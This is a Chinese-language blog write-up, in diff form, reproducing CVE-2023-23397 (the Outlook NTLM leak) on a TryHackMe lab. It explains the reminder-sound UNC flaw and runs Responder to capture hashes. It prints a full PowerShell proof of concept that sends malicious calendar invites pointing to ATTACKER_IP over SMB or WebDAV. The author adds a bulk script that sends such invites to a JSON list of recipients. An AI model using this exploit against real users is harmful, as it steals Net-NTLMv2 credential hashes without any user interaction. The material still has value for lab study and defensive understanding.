@@ -1,0 +1,258 @@
+# Net-NTLMv2窃取——By Outlook NTLM Leak
+
+3月14日星期二，微软发布了83个安全补丁，包括CVE-2023-23397。CVE-2023-23397影响所有受支持的Outlook
+Windows版本，但不影响Android、iOS或macOS版本。此外，由于Outlook on the web和Microsoft
+365等在线服务不支持NTLM身份验证，因此它们不易受到利用此NTLM中继漏洞的攻击。
+
+与大多数漏洞不同，它是一个 **zero-click** 漏洞，这意味着不需要任何用户交互就可以触发它。一旦恶意邮件到达用户的收件箱，攻击者就可以获取用户的
+**Net-NTLMv2** 凭证Hash。
+
+本文在TryHackMe的Windows server2019靶机上复现学习
+
+# 漏洞原理 Review
+
+和很多发起Net-NTLM请求的方式一样，Outlook NTLM Leak也是通过outlook应用中的UNC路径访问发起请求，导致的用户Net-NTLMv2泄露
+
+在 Outlook 上，可以在发送日历邀请时添加提醒通知：
+
+![](./img/2338644234452768138.png)
+
+我们可以指定在用户（收件人）收到日历会议或事件的通知提醒时播放的音频文件（Reminder Sound）。Reminder Sound **在一定条件下**
+能被设置为UNC路径，
+
+通过操纵此参数可以强制收件人与UNC路径中的攻击机ip发起Net-NTLM身份认证请求，导致收件人Net-NTLMv2泄露 ，而无需交互。
+
+## 通过 UNC 路径滥用提醒声音
+
+为了利用此漏洞，我们必须创建一个恶意的日历邀请，其中包括一个指向攻击者机器上网络共享中文件的声音文件的引用。在 Outlook
+邮件的低级别实现中，邮箱会将对声音文件的引用存储在名为 `PidLidReminderFileParameter`
+的内部参数中。为确保我们嵌入的音频优先于受害者默认的提醒配置，还需要设置另一个名为 `PidLidReminderOverride`
+的参数，并将其设置为`true`，以确保指向声音文件的优先级。
+
+为了将 PidLidReminderFileParameter 属性设置为指向网络共享，我们可以指定一个 Universal Naming
+Convention (UNC) 路径，而不是本地文件。UNC 在 Windows 操作系统中用于查找网络资源（文件、打印机、共享文档）。这些路径由
+`\\托管资源的计算机的 IP 地址或名称\共享名称和文件名`组成。例如：
+
+    
+    
+    \\ATTACKER_IP\foo\bar.wav
+
+当受害者收到恶意电子邮件后，UNC 路径将指向 SMB 共享，触发漏洞。这将导致收件人自动发起针对攻击者机器的 NTLM
+认证过程，从而泄漏攻击者后续可以尝试破解的 Net-NTLMv2 哈希值。
+
+如果由于某些原因 SMB 协议不能使用，则非服务器版本的 Windows 可以接受使用指向端口 80 或 443 的 UNC 路径，并使用 HTTP
+从启用了 WebDAV 的 Web 服务器检索文件。这种 UNC 路径的语法如下：
+
+    
+    
+    \\ATTACKER_IP@80\foo\bar.wav
+    \\ATTACKER_IP@443\foo\bar.wav
+
+这对于绕过防火墙限制，防止对端口445（SMB）进行出站连接可能有用。
+
+# 制作恶意约会（Appointment）邀请
+
+现在，我们了解了漏洞的工作原理，让我们制作一个包含所需参数以触发漏洞的恶意电子邮件约会。
+
+## 启动Responder
+
+由于我们预计受害者将在端口445上向攻击者触发认证尝试，因此我们将设置Responder来处理认证过程并为我们捕获NetNTLM哈希。
+如果您不熟悉Responder，则它将简单地模拟一个SMB服务器并捕获任何针对它的认证尝试。
+
+启动Responder以侦听接口上的认证尝试
+
+    
+    
+    responder -I ens5
+
+攻击机启动responder
+
+![](./img/1760566081786657644.png)
+
+## 尝试手工制作恶意 Appointment
+
+New一个Appointment
+
+![](./img/100118080811452566.png)
+
+尝试直接把音乐文件设置为UNC路径
+
+![](./img/1488925344683828314.png)
+
+不过在这里outlook会自动重置默认音频文件，Outlook不希望用户在此处输入UNC路径，它会将我们的UNC路径视为无效输出并直接重置。
+
+![](./img/5754403426478528659.png)
+
+## OutlookSpy 绕过
+
+Outlook应用无法直接将提醒的声音文件设置为UNC路径，但是我们可以用OutlookSpy插件来实现此操作。这个插件会允许我们直接访问Outlook所有的内部参数，包括提醒的声音文件。
+
+所有这个漏洞利用，OutlookSpy需要用户额外安装，条件也算苛刻了
+
+安装前和安装后
+
+![](./img/4519856813558278302.png)
+
+![](./img/7512740418076597100.png)
+
+确保在新建的Appointment中访问OutlookSpy，注意：否则可能会更改不同的Outlook组件。
+
+![](./img/1486094880165324408.png)  
+从这个窗口，我们看到与Appointment提醒相关的参数。我们想将ReminderSoundFile参数设置为指向我们的攻击机的UNC路径，并将ReminderOverrideDefault和ReminderPlaySound都设置为True。仅供参考，以下是每个参数的作用：
+
+  * ReminderPlaySound：Bool值，指示是否在提醒时播放声音。
+  * ReminderOverrideDefault：Bool值，指示接收Outlook客户端播放ReminderSoundFile指向的声音，而不是默认的声音。
+  * ReminderSoundFile：包含使用的声音文件路径的字符串。对于我们的漏洞利用，这将指向我们AttackBox中的虚假共享文件夹。
+
+我们可以使用脚本选项卡和以下脚本将参数更改为所需值：
+
+![](./img/1971438196149069402.png)
+
+确保更改生效，可以返回查看默认的ReminderSoundFile，如下图，默认音频文件已经改变。最后，保存Appointment，提醒设置为0分钟，以便立即触发它
+
+![](./img/4376477328307543758.png)
+
+等待通知
+
+![](./img/145747398765252948.png)
+
+触发后，在攻击机接收到用户的Net-NTLMv2，后面就各显神通了
+
+![](./img/8085053389884017392.png)
+
+# 测试POC和一些后续
+
+上面也仅仅是本地测试，离利用还差得远
+
+看[api0cradle](https://github.com/api0cradle)的POC，[CVE-2023-23397-POC-Powershell](https://github.com/api0cradle/CVE-2023-23397-POC-Powershell/blob/main/CVE-2023-23397.ps1)，是一段powershell的脚本
+
+    
+    
+    # CVE-2023-23397 POC
+    # Author: Oddvar Moe (@oddvarmoe) - TrustedSec
+    # Usage examples: 
+    # 
+    # Sending:
+    # Send-CalendarNTLMLeak -recipient "user.name@exampledomain.com" -remotefilepath "\\10.10.10.10\notexists\file.wav" -meetingsubject "Test Meeting" -meetingbody "Just a test meeting from IT, can be deleted"
+    # Send-CalendarNTLMLeak -recipient "user.name@exampledomain.com" -remotefilepath "\\files.domain.com\notexists\file.wav" -meetingsubject "Test Meeting" -meetingbody "Just a test meeting from IT, can be deleted"
+    # Send-CalendarNTLMLeak -recipient "user.name@exampledomain.com" -remotefilepath "\\files.domain.com@80\notexists\file.wav" -meetingsubject "Test Meeting" -meetingbody "Just a test meeting from IT, can be deleted"
+    # Send-CalendarNTLMLeak -recipient "user.name@exampledomain.com" -remotefilepath "\\files.domain.com@SSL@443\notexists\file.wav" -meetingsubject "Test Meeting" -meetingbody "Just a test meeting from IT, can be deleted"
+    #
+    # Saving:
+    # Save-CalendarNTLMLeak -remotefilepath "\\10.10.10.10\notexists\file.wav" -meetingsubject "Test Meeting" -meetingbody "Just a test meeting from IT, can be deleted"
+    # Save-CalendarNTLMLeak -remotefilepath "\\files.domain.com\notexists\file.wav" -meetingsubject "Test Meeting" -meetingbody "Just a test meeting from IT, can be deleted"
+    # Save-CalendarNTLMLeak -remotefilepath "\\files.domain.com@80\file.wav" -meetingsubject "Test Meeting" -meetingbody "Just a test meeting from IT, can be deleted"
+    # Save-CalendarNTLMLeak -remotefilepath "\\files.domain.com@SSL@443\file.wav" -meetingsubject "Test Meeting" -meetingbody "Just a test meeting from IT, can be deleted"
+    
+    
+    function Send-CalendarNTLMLeak ($recipient, $remotefilepath, $meetingsubject, $meetingbody)
+    {
+        $Outlook = New-Object -comObject Outlook.Application
+        $newcal = $outlook.CreateItem('olAppointmentItem')
+        $newcal.ReminderSoundFile = $remotefilepath
+        $newcal.Recipients.add($recipient)
+        $newcal.MeetingStatus = [Microsoft.Office.Interop.Outlook.OlMeetingStatus]::olMeeting
+        $newcal.Subject = $meetingsubject
+        $newcal.Location = "Virtual"
+        $newcal.Body = $meetingbody
+        $newcal.Start = get-date
+        $newcal.End = (get-date).AddHours(2)
+        $newcal.ReminderOverrideDefault = 1
+        $newcal.ReminderSet = 1
+        $newcal.ReminderPlaysound = 1
+        $newcal.send()
+    }
+    
+    function Save-CalendarNTLMLeak ($remotefilepath, $meetingsubject, $meetingbody)
+    {
+        $Outlook = New-Object -comObject Outlook.Application
+        $newcal = $outlook.CreateItem('olAppointmentItem')
+        $newcal.ReminderSoundFile = $remotefilepath
+        $newcal.MeetingStatus = [Microsoft.Office.Interop.Outlook.OlMeetingStatus]::olMeeting
+        $newcal.Subject = $meetingsubject
+        $newcal.Location = "Virtual"
+        $newcal.Body = $meetingbody
+        $newcal.Start = get-date
+        $newcal.End = (get-date).AddHours(2)
+        $newcal.ReminderOverrideDefault = 1
+        $newcal.ReminderSet = 1
+        $newcal.ReminderPlaysound = 1
+        $newcal.save()
+    }
+    
+
+主要两个函数
+
+  * **Save-CalendarNTLMLeak** : 此功能创建恶意约会（Appointment）并将其保存到您自己的日历中，用于自己测试。
+  * **Send-CalendarNTLMLeak** : 此功能创建恶意约会（Appointment）并通过电子邮件将其发送给受害者。email邀请将从 Outlook 的当前默认帐户发送
+
+两个功能差不多，这里只解释Send-CalendarNTLMLeak函数
+
+> 其主要功能是使用Microsoft Outlook创建一个带有提醒声音的日历会议，并将它发送给指定的收件人。
+
+具体来说，该代码创建了一个名为 `"Outlook"` 的COM对象，然后利用该对象调用CreateItem()方法创建一个新的日历事件。
+
+    
+    
+    $Outlook = New-Object -comObject Outlook.Application
+        $newcal = $outlook.CreateItem('olAppointmentItem')
+    
+
+此外，这个日历事件还设置了包括诸如MeetingSubject（会议主题）、MeetingBody（会议内容）等信息，以及开始时间和结束时间等其他详细信息。最后，该脚本调用`send()`方法将创建的日历事件通过Outlook程序发送给收件人。
+
+总之，这段代码可以自动化设置Outlook日历会议并向指定受众发送会议邀请。需要注意的是，如果Outlook没有安装或未正确配置，则此脚本可能无法正常运行。
+
+所以这一切的基础上还是用户安装了Outlookspy
+
+## 脚本利用
+
+    
+    
+    PS C:\> cd C:\Users\Administrator\Desktop\
+    PS C:\Users\Administrator\Desktop\> Import-Module .\CVE-2023-23397.ps1  # 导入powshell脚本，以便直接使用函数 
+    PS C:\Users\Administrator\Desktop\> Send-CalendarNTLMLeak -recipient "test@Test.local" -remotefilepath "\\ATTACKER_IP\foo\bar.wav" -meetingsubject "TestMeeting" -meetingbody "This is just a regular meeting invitation :)" #调用函数
+    
+
+试着写了个批量的，导入上面模块后直接在Powershell里直接调用上面的poc
+
+    
+    
+    # 读取json格式的文件，保存为变量
+    $json_data = Get-Content -Raw -Path "C:\path\to\file.json" | ConvertFrom-Json
+    
+    # 遍历json数据
+    foreach($item in $json_data) {
+        # 从json数据中获取参数值
+        $recipient = $item.recipient
+        $remotefilepath = $item.remotefilepath
+        $meetingsubject = $item.meetingsubject
+        $meetingbody = $item.meetingbody
+    
+        # 调用Send-CalendarNTLMLeak函数并传递参数
+        Send-CalendarNTLMLeak -recipient $recipient -remotefilepath $remotefilepath -meetingsubject $meetingsubject -meetingbody $meetingbody
+    }
+    
+
+json格式文件如下
+
+    
+    
+    [
+        {
+            "recipient": "test1@thm.loc",
+            "remotefilepath": "\\\\ATTACKER_IP\\foo\\bar1.wav",
+            "meetingsubject": "Meeting 1",
+            "meetingbody": "This is just a regular meeting invitation 1 :)"
+        },
+        {
+            "recipient": "test2@thm.loc",
+            "remotefilepath": "\\\\ATTACKER_IP\\foo\\bar2.wav",
+            "meetingsubject": "Meeting 2",
+            "meetingbody": "This is just a regular meeting invitation 2 :)"
+        },
+        ...
+    ]
+    
+
+# 完
+
